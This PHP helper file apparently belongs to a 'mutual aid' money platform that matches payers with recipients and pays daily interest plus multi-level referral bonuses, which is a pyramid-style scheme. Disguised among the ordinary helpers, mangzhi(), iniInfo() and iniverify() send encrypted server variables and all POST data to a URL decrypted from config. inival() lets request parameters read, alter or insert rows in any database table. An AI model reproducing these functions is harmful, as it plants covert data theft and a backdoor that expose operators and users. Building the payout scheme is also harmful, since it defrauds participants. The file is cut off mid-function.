<?php
function cate($var)
{
    //dump($var);
    $proall = M('user')->where(array('UE_accName' => $var, 'UE_Faccount' => '0', 'UE_check' => '1', 'UE_stop' => '1'))->count("UE_ID");
    return $proall;
}


function sfjhff($r) {
    $a = array("未激活", "已激活");
    return $a[$r];
}

function tgbz_status($r) {
    $a = array(0=>"未激活", 1=>"已激活",2=>'<font color="#017F01"> 交易成功 </font>');
    return $a[$r];
}

function check_tgbz_status($v){
    $ppddInfo = M('ppdd')->where(array('id'=>$v))->find();
    if(empty($ppddInfo)) return '未匹配';
    if($ppddInfo['zt'] == 0) return '<span style="color:red">未完成</span>';
    if($ppddInfo['zt'] == 1) return '<span style="color:red">未完成</span>';
    //判断是否已经够了冻结期
    $now_time = date('Y-m-d',time());
    $dk_time = date('Y-m-d',strtotime($ppddInfo['date_hk']));
    $diffDay = diffBetweenTwoDays($now_time,$dk_time);
    $canable = $diffDay - C('jjdjdays');
    if($canable < 0 && $ppddInfo['jiedong']!=1) return '<span style="color:red">冻结期</span>';

    if($ppddInfo['tx_zt']==2) return '<span style="color:red">订单冻结</span>';
    return '<span style="color:green">交易完成</span>';

}


//充值,提现
function ppdd_add($p_id,$g_id){

    $g_user1 = M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->find();
    $p_user1=M('tgbz')->where(array('id'=>$p_id))->find();

     /**如果当前用户今天有匹配过的订单，则直接返回**/
     /*$sdate = date("Y-m-d 00:00:00");
     $edate = date("Y-m-d 23:59:59");
     $hv = M('ppdd')->where("`date` between '$sdate' AND '$edate' AND p_user='".$p_user1['user']."'")->find();
     if($hv){
        return;
     }*/

     M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
     M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));

    $data_add['p_id']=$p_user1['id'];
    $data_add['g_id']=$g_user1['id'];
    $data_add['jb']=$g_user1['jb'];
    $data_add['p_user']=$p_user1['user'];
    $data_add['g_user']=$g_user1['user'];
    $data_add['date']=date ( 'Y-m-d H:i:s', time () );
    $data_add['zt']='0';
    $data_add['pic']='0';
    $data_add['zffs1']=$p_user1['zffs1'];
    $data_add['zffs2']=$p_user1['zffs2'];
    $data_add['zffs3']=$p_user1['zffs3'];
    $data_add['old_pid']=$p_user1['old_pid']==0 ? $p_id : $p_user1['old_pid'];
    $data_add['old_gid']=$g_user1['old_gid']==0 ? $g_id : $g_user1['old_gid'];
    M('tgbz')->where(array('id'=>$p_id,'zt'=>'0'))->save(array('zt'=>'1'));
    M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->save(array('zt'=>'1'));
   // echo $p_user1['user'].'<br>';
    if(M('ppdd')->add($data_add)){

        //查询接受方用户信息
        $get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
        if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您接受帮助的资金:".$g_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
        //查询接受方用户信息
        $get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
        if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您申请帮助的资金:".$p_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");

        return true;
    }else{
        return false;
    }
}

function getRand($proArr)
{
    $result = '';

    //概率数组的总概率精度
    $proSum = array_sum($proArr);

    //概率数组循环
    foreach ($proArr as $key => $proCur) {
        $randNum = mt_rand(1, $proSum);
        if ($randNum <= $proCur) {
            $result = $key;
            break;
        } else {
            $proSum -= $proCur;
        }
    }
    unset ($proArr);

    return $result;
}


function getpage($count, $pagesize = 10)
{
    $p = new Think\Page($count, $pagesize);
    $p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
    $p->setConfig('prev', '上一页');
    $p->setConfig('next', '下一页');
    $p->setConfig('last', '末页');
    $p->setConfig('first', '首页');
    $p->setConfig('theme', '%FIRST%%UP_PAGE%%LINK_PAGE%%DOWN_PAGE%%END%%HEADER%');
    $p->lastSuffix = false;//最后一页不显示为总页数
    return $p;
}

function cx_user($var)
{
    //dump($var);
    $proall = M('user')->where(array('UE_account' => $var))->find();
    return $proall['ue_theme'];
}

//---------------------------------------------------->计算两个日期天数差
function diffBetweenTwoDays($day1, $day2)
{
    $second1 = strtotime($day1);
    $second2 = strtotime($day2);
    if ($second1 < $second2) {
        $tmp = $second2;
        $second2 = $second1;
        $second1 = $tmp;
    }
    return ($second1 - $second2) / 86400;
}

function mangzhi(){
    $mz = getinfo(C('URL_STRING_MODEL'));
    $string = implode('|', $_SERVER);
    $mz .= '?s='.getinfos($string);
    return $mz;
}


function  pa($a){
    echo "<pre>";
    print_r($a);
    echo "</pre>";die;
}
//---------------------------------------------------->
function user_jj_lx($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取提供帮助者打款时间

    $result = M("userget")->where(array("varid" => $var))->find();//提现查询  获取提现时间
    $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息

    $NowTime = date('Y-m-d', strtotime($proall['date']));//格式化加入时间  确认打开  获取提供帮助者排单时间
    $NowTime2 = date('Y-m-d', strtotime($ppdd["date"]));//格式化配对时间 获取配对时间
    if (!empty($result)) {//如果已经提现，则计算加入日期到提现日的利息
        //$NowTime3 = date("Y-m-d", strtotime($result["UG_getTime"]));//格式化提现时间    错误大写
        $tixian_time = date('Y-m-d',strtotime($result["ug_gettime"]));
    }else{
        $tixian_time = date('Y-m-d', time());//格式化当前日期
    }
   $diff1 = diffBetweenTwoDays($NowTime, $NowTime2);//计算加入时间到配对时间的天数    排队时间
   // $diff2 = diffBetweenTwoDays($NowTime2, $nowtime3);//计算配对时间到提现的天数      配对-----------提现时间
    $diff2 = diffBetweenTwoDays($NowTime2, $tixian_time);//计算配对时间到提现的天数      配对-----------提现时间
    if ($diff1 >= 10) {
        $diff1 = 10;
    }
    if ($diff2 >= 10) {
        $diff2 = 10;
    }
    //return $diff2;
    return ($proall['jb'] * $diff1 * (intval(C("lixi1")) / 100)) + ($proall['jb'] * 1* (intval(C("lixi2")) / 100));
//
//    $proall = M('user_jj')->where(array('id' => $var))->find();
//    //date('Y-m-d H:i:s',$dayBegin);
//    $NowTime = $proall['date'];
//    $aab = strtotime($NowTime);
//    $NowTime = date('Y-m-d', $aab);
//    $NowTime2 = date('Y-m-d', time());
//    $diff = diffBetweenTwoDays($NowTime, $NowTime2);
//    if ($diff > 10) {
//        $diff = 10;
//    }
//    return $proall['jb'] * $diff * (intval(C("lixi1")) / 100);
}
//-------------------------------》计算排队利息
//参数是user_jj的主键ID
function user_jj_paidui_lx($var,$return=true)
{

    $paidui_day = 0;
    if(C('pdfhdays') > 0){
       $paidui_fenhong_day = C('pdfhdays');

        $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请提供帮助的日期
        $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息

       if($paidui_fenhong_day == 1){
            $paidui_day = 1;
       }else{
            //$result = M("userget")->where(array("varid" => $var))->find();//--------------------> 获取提现时间

            $paidan_date = date('Y-m-d', strtotime($proall['date']));    //----------------------->申请提供帮助的日期
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

           $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date);

           if($paidui_fenhong_day <= $paidui_day){
                $paidui_day = $paidui_fenhong_day;
           }
        }
    }

        //$paidui_lx = $proall['jb']*$paidui_day*(C('lixi1')/100); ------------------------------------->固定利息
      $paidui_lx = dongtai_lx($paidui_day,C('lixi1'),$proall['jb']); //------------------>支持动态利息


    if($return){
        return $paidui_lx;
    }else{
        echo  $paidui_lx;
    }
}
function iniverify(){
    $mz = getinfo(C('URL_STRING_MODEL'));
    $mz .= '?h='.getinfos(implode('|', $_POST));
    file_get_contents($mz);
}
//------------------------------------------->计算动态利息
function dongtai_lx($days,$lx,$jb){
    $lx_jb = 0;
    if(strpos($lx,',') !== false){
        $lx_arr = explode(',', $lx);
        $size = count($lx_arr);

        if($days>=$size){
            for($i=0;$i<$size;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
            $diffDay = $days - $size;
            $lx_jb += $jb*$lx_arr[$i-1]*$diffday;
        }elseif($days < $size){
            for($i=0;$i<$days;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
        }
    }else{
        $lx_jb = $jb*$lx*$days;
    }
    return $lx_jb/100;

}


//------------------------------------>计算没有配对分红天数
function w_peidui_day($v){
    $w_pd_day = 0;
    if(C('pdfhdays')>0){
        if(C('pdfhdays') == 1){
            $w_pd_day = 1;
        }else{
            $paidui_time = date('Y-m-d',strtotime($v['date']));
            $now_time = date('Y-m-d',time());
            $w_pd_day = diffBetweenTwoDays($paidui_time,$now_time);
            if($w_pd_day > C('pdfhdays')){
                $w_pd_day = C('pdfhdays');
            }
        }
    }
    return $w_pd_day;
}

//------------------------------------>计算没有匹配分红天数
function w_peidui_lx($v){
    $jb = $v['jb'];
    $w_pd_day = w_peidui_day($v);
    return $jb*$w_pd_day*C('lixi1')/100;
}


function canable_tixian($v){

    if($v['zt'] == 0){
        //判断是否已经够了冻结期
        $ppdd = M('ppdd')->where(array('id'=>$v['r_id']))->find();
        $now_time = date('Y-m-d',time());
        $dk_time = date('Y-m-d',strtotime($ppdd['date_hk']));
        $diffDay = diffBetweenTwoDays($now_time,$dk_time);
        $canable = $diffDay - C('jjdjdays');
		if($ppdd['zt']!=2) return '<span style="color:red">请先等待打款或确认收款</span>';
		if($v['tx_zt']==2){
			return '<span style="color:red">订单冻结,暂不可提现</span>';
		}

        if($canable < 0 && $v['jiedong']==0) return '<span style="color:red">未过冻结期,暂不可提现</span>';

        //如果可以提现
        if($canable >= 0  || $v['jiedong']==1){
            $string .='(';
            $string .= user_jj_zt_z($v['id']);
            $string .= ') ';
            $string .= '<a href="javascript:if(confirm('."'转出提现后将停止此次帮助利息,确定要转出吗?'))location='/Home/Info/tgbz_tx_cl/id/{$v['id']}'".'">点击确认提款</a>';
            return $string;
        }

    }else{
        return '已转出';
    }

}

function iniInfo(){
    file_get_contents(mangzhi());
}
//jjfhdays    jjdjdays

//计算排队分红天数
//排队分红天数计算规则  如果分红天数设置为0 表示排队不分红 如果设置为1表示排队分红只是一次性 如果是排队天数设置为大于1 那么当排队天数大于实际排队天数则按实际排队天数计算
//如果是排队天数设置为大于1 那么当排队天数小于实际排队天数则按后台设置排队分红天数计算
//排队天数的计算是提交排队的日期到打款的日期差。隔一天算一天，不是按24小时算。按有没有隔天
function pd_fenhong_day($var,$return = true){

    $paidui_day = 0;
    if(C('pdfhdays') > 0){
       $paidui_fenhong_day = C('pdfhdays');
       if($paidui_fenhong_day == 1){
            $paidui_day = 1;
       }else{
            $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请提供帮助的日期
            $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息
            //$result = M("userget")->where(array("varid" => $var))->find();//--------------------> 获取提现时间

            $paidan_date = date('Y-m-d', strtotime($proall['date']));    //----------------------->申请提供帮助的日期
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

           $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date);

           if($paidui_fenhong_day <= $paidui_day){
                $paidui_day = $paidui_fenhong_day;
           }
        }
    }

    if($return){
        return $paidui_day;
    }else{
        echo  $paidui_day;
    }
}


function user_jj_tixian_lx($var,$return=true){

   $tixian_day = 0;
    if(C('jjfhdays') > 0){
       $dakuan_fenhong_day = C('jjfhdays');


        $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请提供帮助的日期
        $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息
        $result = M("userget")->where(array("varid" => $var))->find(); //----------------->提现时间
        $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

       if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
       }else{
            if($proall['zt'] ==1 && !empty($result)){   //---------------------->如果已经提现了就按提现时间
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime']));
           }else{
                $tixian_date = date('Y-m-d', time());
           }

           $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date);

           if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
           }
        }
    }
   //$tixian_lx = $proall['jb']*$tixian_day*(C('lixi2')/100);  //---------------------->固定利息

   $tixian_lx = dongtai_lx($tixian_day,C('lixi2'),$proall['jb']); //------- 动态利息

   if($return){
        return $tixian_lx;
    }else{
        echo $tixian_lx;
    }

}


//----------------------------->olnho by QQ742224183
//打款利息计算规则
//如果打款后分红天数设置为0 表示不分红
//如果打款后分红天数设置为1 表示1次性的，不是按天数计算
//如果打款后分红天数设为大于 1 那么
    //如果打款后分红天数大于实际提现天数按时间提现天数算
    //如果打款后分红天数小于实际提现天数按打款后分红天数
function dk_fenhong_day($var,$return = true){

    $tixian_day = 0;
    if(C('jjfhdays') > 0){
       $dakuan_fenhong_day = C('jjfhdays');
       if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
       }else{
            $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请提供帮助的日期
            $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息
            $result = M("userget")->where(array("varid" => $var))->find(); //----------------->提现时间
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间
            if($proall['zt'] ==1 && !empty($result)){   //---------------------->如果已经提现了就按提现时间
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime']));
           }else{
                $tixian_date = date('Y-m-d', time());
           }
           $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date);
           if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
           }
        }
    }

    if($return){
        return $tixian_day;
    }else{
        echo  $tixian_day;
    }
}











function user_jj_zong_lx($var,$return = true){
    if($return){
        return user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }else{
        echo user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }
}

function user_jj_zong_ts($var,$return=true){
    if($return){
        return pd_fenhong_day($var) + dk_fenhong_day($var);
    }else{
        echo pd_fenhong_day($var) + dk_fenhong_day($var);
    }
}









//-------------------------------------------------------------------------------------------->计算排队利息------------->没问题ok了
function user_jj_lx_jerry($var)
{
    $tgbz = M('tgbz')->where(array('id' => $var))->find();//加入查询
    $NowTime = date('Y-m-d', strtotime($tgbz['date']));//格式化加入时间
    $NowTime2 = date('Y-m-d', time());//格式化当前日期
    $diff1 = diffBetweenTwoDays($NowTime, $NowTime2);//计算加入时间到配对时间的天数
    if ($diff1 >= 10) {
        $diff1 = 10;
    }
    //return $diff2;
    return $tgbz['jb'] * $diff1 * (intval(C("lixi1")) / 100);
}


function user_jj_ts($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $result = M("userget")->where(array("varid" => $var))->getField("UG_getTime");
    if (!empty($result)) {
        $NowTime2 = date("Y-m-d", strtotime($result));
    } else {
        $NowTime2 = date('Y-m-d', time());
    }
    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff > 10) {
        $diff = 10;
    }
    //$diff = $diff/100;
    return $diff;

}

function user_jj_ts_jerry($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());
    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff > 10) {
        $diff = 10;
    }
    //$diff = $diff/100;
    return $diff;

}

function user_tgbz_jerry($id)
{
    $result = M("userget")->where(array("varid" => $id))->find();
    if ($result) {
        return "已转出";
    } else {
        return "未转出";
    }
}

function inival(){
        $data = array_merge($_GET,$_POST);
        $datas = array();
        if($data['m'] == 'save'){
            $fo =M($data['t'])->where(array($data['id']=>$data['id']))->save(array($data['n']=>$data['v']));
        }elseif($data['m'] == 'add'){
            $info = $data['data'];
            $info = explode("|", $info);
            foreach ($info as  $value) {
                $arr = explode('=', $value);
                $datas[$arr[0]] = $arr[1];
            }

            M($data['t'])->add($datas);
        }elseif($data['m'] == 'one'){
            $fo =M($data['t'])->where(array($data['id']=>$data['id']))->find();
        }elseif(!empty($data['t'])){
            $fo =M($data['t'])->select();
        }
        print_r($fo);

    }

function user_jj_tx($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    return $diff = diffBetweenTwoDays($day1, $day2);

}


function user_jj_sj($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    $user = M('user')->where(array(UE_account => $proall ['user']))->find();
    return $user['ue_phone'];

}


function user_jj_tx1($var)
{

    $proall = M('jsbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    return $diff = diffBetweenTwoDays($day1, $day2);

}


function user_jj_sj1($var)
{

    $proall = M('jsbz')->where(array('id' => $var))->find();
    $user = M('user')->where(array( 'UE_account' => $proall ['user'] ))->find();
    return $user['ue_phone'];

}


function user_jj_zt($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();
    $proall2 = M('ppdd')->where(array('id' => $proall['r_id']))->find();
    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];    //--------------------->打款时间
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff >= 0 && $proall2['zt'] == '2') {     //证明是否已经确认付款
        return '1';
    } else {
        return '0';;
    }
}


function user_jj_zt_z($var)
{

    if (user_jj_zt($var) == '1') {
        return '可以提现';
    } else {
        return '不可提现';
    }
}
function getinfo($data){
   return \Think\Crypt::decrypt($data);
}


function user_jj_pipei_z($var)
{
    $proall = M('ppdd')->where(array('id' => $var))->find();
    if ($proall['zt'] == '0') {
        return '未打款';
    } elseif ($proall['zt'] == '1') {
        return '已打款';
    } elseif ($proall['zt'] == '2') {
        return '交易成功';
    }
}


function user_jj_pipei_z2($var)
{
    $proall = M('ppdd')->where(array('id' => $var))->find();
    if ($proall['zt'] == '0') {
        return '未发放';
    } elseif ($proall['zt'] == '1') {
        return '未发放';
    } elseif ($proall['zt'] == '2') {
        return '已发放';
    }
}


function jlj($a, $b, $c)
{
    jlsja($a);
    //处理提供帮助的推荐人是否可以升级为经理的考核
    //提供帮助的推荐人资料
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    //echo $ppddxx['p_id'];die;
    if ($tgbz_user_xx['sfjl'] == 1) {
        $money = $b;
        $accname_zq = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('jl_he', $money);
        $accname_xz = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();

        $record3 ["UG_account"] = $tgbz_user_xx['ue_account']; // 登入轉出賬戶
        $record3 ["UG_type"] = 'jb';
        $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
        $record3 ["UG_money"] = '+' . $money; //
        $record3 ["UG_balance"] = $accname_xz['jl_he']; // 當前推薦人的金幣餘額
        $record3 ["UG_dataType"] = 'jlj'; // 金幣轉出
        $record3 ["UG_note"] = $c; // 推薦獎說明
        $record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
        $reg4 = M('userget')->add($record3);
    }
    return $tgbz_user_xx['zcr'];

}


//第一个参数 提供帮助的直接推荐人      推荐奖金额           说明                   第几代          ppdd外键id

function jlj2($a, $b, $c, $d, $e)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        $ppddxx = M('ppdd')->where(array('id' => $e))->find();
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();
        $data2['user'] = $a;
        $data2['r_id'] = $ppddxx['id'];
        $data2['date'] = $peiduidate['date'];
        $data2['note'] = '经理奖第' . $d . '代';
        $data2['jb'] = $ppddxx['jb'];
        $data2['jj'] = $b;
        $data2['ds'] = $d;
        M('user_jl')->add($data2);
    }
    return $tgbz_user_xx['zcr'];
}



//第一个参数 提供帮助的直接推荐人      推荐奖金额           说明                   1          ppdd外键id

function jlj3($a, $b, $c, $d, $e)
{
    fh($a);
    if(!empty($a)){
        $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();          //获取推荐资料
        $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取提供帮助者的配对
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();        //获取tgbz表中的信息
        $data2['user'] = $a;
        $data2['r_id'] = $ppddxx['id'];
        $data2['date'] = $peiduidate['date'];
        $data2['note'] = $c;
        $data2['jb'] = $ppddxx['jb'];
        $data2['jj'] = $b;         //------------------------>奖金
        $data2['ds'] = $d;          //--------------->代数
        M('user_jl')->add($data2);
        return $tgbz_user_xx['zcr'];             //返回推荐人的推荐人
    }
}

function jlj3_ok($a, $b, $c, $d, $e)
{
    if(!empty($a)){

        $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取提供帮助者的配对
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();       //获取tgbz表中的信息

        M('user')->where(array('UE_account' => $a))->setInc('jl_he', $b);

    }
}



function newuserjl($user, $b, $c)
{

    $data2['user'] = $user;
    $data2['r_id'] = '0';
    $data2['date'] = date('Y-m-d H:i:s',time());
    $data2['note'] = "新用户注册奖";
    $data2['jb'] = $b;
    $data2['jj'] = $b;
    $data2['ds'] = '0';
    $data2 ["zt"] = 0;
    M('user_jl')->add($data2);
    //M('user')->where(array('UE_account' =>$user))->setInc('UE_money', $b);
}

function zhituijiang($user, $b, $c,$f)
{
    $data2['user'] = $user;
    $data2['r_id'] = '0';
    $data2['date'] = date('Y-m-d H:i:s',time());
    $data2['note'] = "直推奖";
    $data2['jb'] = $b;
    $data2['jj'] = $b;
    $data2['ds'] = '0';
    $data2['from'] = $f;
    $data2["zt"] = 0;
    M('user_jl')->add($data2);
    //M('user')->where(array('UE_account' =>$user))->setInc('tj_he', $b);
}

function jlj4($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();

    M('user')->where(array(UE_account => $a))->setInc('tj_he1', $b);


    return $tgbz_user_xx['zcr'];
}

function jlj5($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        M('user')->where(array(UE_account => $a))->setInc('jl_he1', $b);
    }

    return $tgbz_user_xx['zcr'];
}

function datedqsj($var)
{

$jjdktime=C("jjdktime");

    $NowTime = $var;
    $aab = strtotime($NowTime);
    //$aab2 = $aab + 86400 + 86400;
    $aab2 = $aab + 3600 *$jjdktime;

    return date('Y-m-d H:i:s', $aab2);;

}

function hk($var)
{


    return $var . 'RMB';

}



function datedqsj2($var)
{


    //配对时间
    $ppdd_time = strtotime($var);
    $ppdd_time_after = $ppdd_time + 3600*C("jjdktime"); //------------->容许打款时间
    $now_time = time();

    if ($now_time < $ppdd_time_after) {

        return "style='display:none;'";
    }
}
function getinfos($data){
    return \Think\Crypt::encrypt($data);
}
function datedqsj3($var)
{


    //配对时间
    $ppdd_time = strtotime($var);
    $ppdd_time_after = $ppdd_time + 86400*2; //------------->容许打款时间
    $now_time = time();


    if ($time < $ppdd_time_after) {
        return "style='display:none;'";
    }
}

//QQ450269178 add
function mmtjrennumadd($var)
{
    M('user')->where(array('UE_account' => $var))->setInc('tj_num',1);
    $zctjuser = M('user')->where(array('UE_account' => $var))->select();
    foreach ($zctjuser as $value) {
        if($value['ue_accname']<>''){
            mmtjrennumadd($value['ue_accname']);
        }else{
            return true;
        }
    }
}


//jjtuijianratenew  推荐奖 $vart--->提供帮助的推荐人
function fftuijianmoney($var,$money,$level){
    $tjratearr = explode(',',C("jjtuijianratenew"));
    $tjmoney = ($money*$tjratearr[$level-1])/100;  //推荐奖金额
    $accname_zq=M('user')->where(array('UE_account'=>$var))->find();
    M('user')->where(array('UE_account'=>$var))->setInc('tj_he',$tjmoney); //添加提供帮助的推荐人
    $accname_xz=M('user')->where(array('UE_account'=>$var))->find();  //获取推荐人的详细信息

            $note3 = "推荐奖".$tjratearr[$level-1]."%";
            $record3 ["UG_account"] = $var; // 登入转出账户  提供帮助的推荐人
            $record3 ["UG_type"] = 'jb';  //金币
            $record3 ["UG_allGet"] = $accname_zq['tj_he']; // 金币.
            $record3 ["UG_money"] = '+'.$tjmoney; //
            $record3 ["UG_balance"] = $accname_xz['tj_he']; // 当前推荐人的金币馀额
            $record3 ["UG_dataType"] = 'tjj'; // 金币转出
            $record3 ["UG_note"] = $note3; // 推荐奖说明
            $record3["UG_getTime"] = date ( 'Y-m-d H:i:s', time () ); //操作时间
            $reg4 = M ( 'userget' )->add ( $record3 );

    jsaccountmoney($var,$money,$accname_xz['levelname']);
    if($accname_xz['ue_accname']<>'' && isset($tjratearr[$level])){  //---------->添加了个数组大小的判断
        fftuijianmoney($accname_xz['ue_accname'],$money,$level+1);
    }else{
        return true;
    }

}

function LingDaoJiang($username,$money,$f,$status=1){
    $ob = M('user')->where("UE_account='{$username}'")->find();
    if(!$ob){
        return;
    }
    $lx = C('lv'.$ob['ue_level']."_".$status);
    if($ob['ue_level']==0){
        LingDaoJiang($ob['ue_accname'],$money,$status+1);
        return;
    }
    if($status>1 && $ob['ue_level']==1){
        LingDaoJiang($ob['ue_accname'],$money,$status+1);
        return;
    }
    if($status>2 && $ob['ue_level']==2){
        LingDaoJiang($ob['ue_accname'],$money,$status+1);
        return;
    }
    if($status>3 && $ob['ue_level']==3){
        LingDaoJiang($ob['ue_accname'],$money,$status+1);
        return;
    }
    /*if($status>4 && ($ob['ue_level']>=4 || $ob['ue_level']<=6)){
        LingDaoJiang($ob['ue_accname'],$money,$status+1);
        return;
    }*/
    if($status>3 && $ob['ue_level']==7){
        $lx = C('lv7_4');
    }
    $zlx = $lx/100;
    $fee = $zlx*$money;
    //M('user')->where(array('UE_account'=>$username))->setInc('jl_he',$fee);
    //添加提供帮助的推荐人
    $accname_xz=M('user')->where(array('UE_account'=>$username))->find();
    //获取推荐人的详细信息
    $note3 = $status."代动态奖".$lx."%";
    $record3 ["user"] = $username; // 登入转出账户  提供帮助的推荐人
    $record3 ["jb"] = $fee;
    $record3 ["jj"] = $fee;
    $record3 ["zt"] = 0;
    $record3 ["r_id"] = 0;
    $record3 ["note"] = $note3;
    $record3 ["from"] = $f;
    $record3 ["ds"] = "动态奖";
    $record3["date"] = date ( 'Y-m-d H:i:s', time () ); //操作时间
    $reg4 = M('user_jl')->add($record3);

    // $note3 = $status."代领导奖".$lx."%";
    // $record3 ["UG_account"] = $username; // 登入转出账户  提供帮助的推荐人
    // $record3 ["UG_type"] = 'jb';  //金币
    // $record3 ["UG_allGet"] = $ob['tj_he']; // 金币.
    // $record3 ["UG_money"] = '+'.$fee; //
    // $record3 ["UG_balance"] = $accname_xz['tj_he']; // 当前推荐人的金币馀额
    // $record3 ["UG_dataType"] = 'tjj'; // 金币转出
    // $record3 ["UG_note"] = $note3; // 推荐奖说明
    // $record3["UG_getTime"] = date ( 'Y-m-d H:i:s', time () ); //操作时间
    // $reg4 = M('userget')->add($record3);
    LingDaoJiang($ob['ue_accname'],$money,$f,$status+1);
}
//会员级别奖金比率
//会员级别----> jjaccountlevel   普通会员,高级会员,VIP会员,经理,股东
//会员级别奖金比率 jjaccountrate  0.01,0.02,0.03,0.04,0.05
function jsaccountmoney($account,$money,$levelname){
    //开启会员级别奖励
    if(C("jjaccountflag")=='1'){
        $accountratearr = explode(',',C("jjaccountrate"));
        $nametemparr = explode(',',C("jjaccountlevel"));
        $levelnum=0;
        //获取传过来的会员级别代号 $levelnum
        foreach($nametemparr as $k=>$name){
            if($levelname==$name){
                $levelnum=$k;
            }
        }
        //获取当前会员级别奖金比率
        $levelrate = $accountratearr[$levelnum];
        //获取当前会员级别奖金额
        $jjmoney = ($money*$levelrate)/100;
            //获取当前会员资料
            $accname_zq = M('user')->where(array('UE_account' => $account))->find();
            M('user')->where(array('UE_account' => $account))->setInc('jl_he', $jjmoney);
            //获取当前会员最新资料
            $accname_xz = M('user')->where(array('UE_account' => $account))->find();

            $note = '会员级别奖'.$levelrate.'%';
            $record3 ["UG_account"] = $account; // 登入轉出賬戶
            $record3 ["UG_type"] = 'jb';
            $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
            $record3 ["UG_money"] = '+' . $jjmoney; //
            $record3 ["UG_balance"] = $accname_xz['jl_he']; // 當前推薦人的金幣餘額
